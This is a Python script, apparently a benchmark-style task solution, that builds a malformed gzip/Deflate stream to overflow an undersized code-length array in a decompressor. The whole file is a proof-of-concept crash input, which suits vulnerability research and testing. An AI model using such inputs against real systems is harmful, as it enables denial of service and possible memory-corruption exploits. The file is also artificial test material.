import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = bytes([0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        deflate = self._make_deflate_overflow_block()
        footer = b'\x00' * 8
        return header + deflate + footer

    def _make_deflate_overflow_block(self) -> bytes:
        out = bytearray()
        bitbuf = 0
        bitcnt = 0

        def putbits(value: int, nbits: int):
            nonlocal bitbuf, bitcnt
            bitbuf |= (value & ((1 << nbits) - 1)) << bitcnt
            bitcnt += nbits
            while bitcnt >= 8:
                out.append(bitbuf & 0xFF)
                bitbuf >>= 8
                bitcnt -= 8

        # Deflate dynamic block header with HCLEN=15 to overflow at code length array
        putbits(1, 1)   # BFINAL = 1
        putbits(2, 2)   # BTYPE = 2 (dynamic)
        putbits(0, 5)   # HLIT = 0 (257 codes)
        putbits(0, 5)   # HDIST = 0 (1 code)
        putbits(15, 4)  # HCLEN = 15 (19 code length codes total)

        # Provide 16 code length code lengths (3 bits each), all zeros
        # This reaches the 16th write into an array incorrectly sized to 15
        for _ in range(16):
            putbits(0, 3)

        if bitcnt > 0:
            out.append(bitbuf & 0xFF)
            bitbuf = 0
            bitcnt = 0

        while len(out) < 9:
            out.append(0)

        return bytes(out[:9])